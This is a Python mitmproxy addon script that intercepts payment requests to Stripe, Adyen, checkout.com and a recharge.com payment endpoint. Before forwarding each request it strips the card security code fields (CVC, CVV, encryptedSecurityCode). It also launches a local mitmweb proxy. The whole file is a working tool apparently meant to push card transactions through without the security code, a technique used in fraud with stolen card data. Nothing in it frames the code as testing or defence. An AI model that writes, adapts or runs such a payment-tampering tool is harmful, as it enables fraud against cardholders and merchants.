from urllib.parse import parse_qsl, urlencode
from mitmproxy import http, ctx
import json

def remove_cvc(payload):
    if 'card[cvc]' in payload:
        print('\n\n\ncard[cvc] found in payload')
        del payload['card[cvc]']
        print('\n\n\nRemoving [card][cvc] from payload')
    elif 'payment_method_data[card][cvc]' in payload:
        print('\n\n\npayment_method_data[card][cvc] found in payload')
        del payload['payment_method_data[card][cvc]']
        print('\n\n\nRemoving payment_method_data[card][cvc] from payload')
    elif 'source_data[card][cvc]' in payload:
        print('\n\n\nsource_data[card][cvc] found in payload')
        del payload['source_data[card][cvc]']
        print('\n\n\nRemoving source_data[card][cvc] from payload')
    return payload

def remove_encrypted_security_code(content):
    if 'paymentMethod' in content and 'encryptedSecurityCode' in content['paymentMethod']:
        print('\n\n\nencryptedSecurityCode found in content')
        del content['paymentMethod']['encryptedSecurityCode']
        print('\n\n\nRemoving encryptedSecurityCode from content')
    return content

def modify_checkout_json(payload):
    if 'cvv' in payload:
        print('\n\n\ncvv found in payload')
        del payload['cvv']
        print('\n\n\nRemoving cvv from payload')
    return payload

def request(flow: http.HTTPFlow) -> None:
    url = flow.request.url
    print("Intercepted request URL:", url)

    try:
        if url.startswith('https://api.stripe.com/v1/payment_methods') \
                or url.startswith('https://api.stripe.com/v1/payment_intents') \
                or url.startswith('https://api.stripe.com/v1/setup_intents') \
                or url.startswith('https://api.stripe.com/v1/tokens') \
                or url.startswith('https://api.stripe.com/v1/sources'):
            print("Processing Stripe API request...")
            payload = dict(parse_qsl(flow.request.text))
            print('\n\n\nPayload:', payload)
            modified_payload = remove_cvc(payload)
            print('\n\n\nModified Payload:', modified_payload)
            encoded_data = urlencode(modified_payload).encode('utf-8')
            print('\n\n\nEncoded Data:', encoded_data)
            flow.request.content = encoded_data
            ctx.log.info(f"Modified request payload for {url}")

        elif url.startswith('https://checkoutshopper-live.adyen.com/checkoutshopper/v68/paybylink/payments'):
            print("Processing Adyen checkoutshopper request...")
            content = json.loads(flow.request.get_text(strict=False))
            print("Content:", content)
            modified_content = remove_encrypted_security_code(content)
            print('\n\n\nModified Content:', modified_content)
            flow.request.text = json.dumps(modified_content)
            ctx.log.info(f"Modified request payload for {url}")

        elif url.startswith('https://api.checkout.com/tokens'):
            if flow.request.method == 'POST':
                print("Processing checkout.com tokens request...")
                payload = json.loads(flow.request.get_text(strict=False))
                print("Payload:", payload)
                modified_payload = modify_checkout_json(payload)
                print('\n\n\nModified Payload:', modified_payload)
                flow.request.text = json.dumps(modified_payload)
                ctx.log.info(f"Modified request payload for {url}")
            else:
                print("Skipping non-POST request for checkout.com tokens")
            
        elif url.startswith('https://pay.recharge.com/pay/adyen/visa/payment/process'):
            print("Processing Adyen recharge request...")
            content = flow.request.get_text(strict=False)
            print("Content:", content)
            data = dict(item.split('=') for item in content.split('&'))
            if 'encryptedSecurityCode' in data:
                print("Removing encryptedSecurityCode from data...")
                del data['encryptedSecurityCode']
            output_string = '&'.join([f"{key}={value}" for key, value in data.items()])
            print('\n\n\nModified Output String:', output_string)
            flow.request.text = output_string
            ctx.log.info(f"Modified request payload for {url}")

    except json.JSONDecodeError as e:
        ctx.log.error(f"JSON decoding error: {e}")
        ctx.log.error(f"Request URL: {url}")
        ctx.log.error(f"Request content: {flow.request.content}")

if __name__ == "__main__":
    from mitmproxy.tools.main import mitmweb
    mitmweb(["-s", __file__, "-p", "8000"])
